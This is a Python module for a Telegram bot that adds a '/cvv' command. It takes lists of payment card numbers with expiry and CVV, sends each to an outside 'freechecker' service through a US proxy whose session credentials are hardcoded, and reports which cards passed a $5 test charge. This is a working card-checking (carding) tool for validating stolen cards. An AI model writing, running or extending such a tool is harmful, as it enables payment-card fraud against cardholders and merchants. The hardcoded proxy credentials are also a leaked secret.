import requests
from EQUROBOT import app
from pyrogram import filters


@app.on_message(filters.command("cvv"))
async def handle_cvv(client, message):    
    if len(message.text) < 2:
        await message.reply_text("Please provide card details in the format: `cc|mm|yyyy|cvv`")
        return
    card_info = message.text.split(maxsplit=1)[1]
    data = card_info.split("\n")
    cards_number = list(data)
    for cards in cards_number:
        await cvv_checker(message, cards)
    await message.reply_text("DONE ✅")
    
    


async def cvv_checker(message, cards):
    try:
        url = "https://freechecker.hrk.dev/checker"
        proxy = "proxy.proxyverse.io:9200:country-us-session-df073d4956f342a3bfe074d2f6415a47:a5a94a55-c0b7-4e60-9acd-5e5f3cf09d6c"

        params = {
            'cc': cards,
            'proxy': proxy
        }


        response = requests.get(url, params=params)
        data = response.json()

        if "error" not in data:
            payment_details = data.get('payment', {})
            invoice = payment_details.get('invoice', '--')
            payment_id = payment_details.get('payment', '--')
            amount = payment_details.get('amount', '--')
            currency = payment_details.get('currency', '--')

            response_text = f"""
APPROVED 5$ ✅

Card ⇾ {cards}
Response ⇾ CVV CHARGE [✅]("https://graph.org/file/a40333d52b108f5de4859.jpg") 
Invoice ⇾ {invoice}
Payment ⇾ {payment_id}
Amount ⇾ {amount} {currency}
            """
        else:
            error_details = data.get('details', {}).get('error', {})
            error_message = error_details.get('message', 'Your card was declined.')
            error_code = error_details.get('code', '--')
            decline_code = error_details.get('decline_code', '--')

            payment_details = data.get('payment', {})
            failed_reason_message = payment_details.get('message', {}).get('failed_reason_message', 'Your card was declined.')

            response_text = f"""
DECLINED ❌

Card ⇾ {cards}
Response ⇾ {failed_reason_message}
Code ⇾ {error_code} 
Decline ⇾ {decline_code}
            """                
    except Exception as e:
        response_text = f"An error occurred: {str(e)}"
    
    await message.reply_text(response_text)

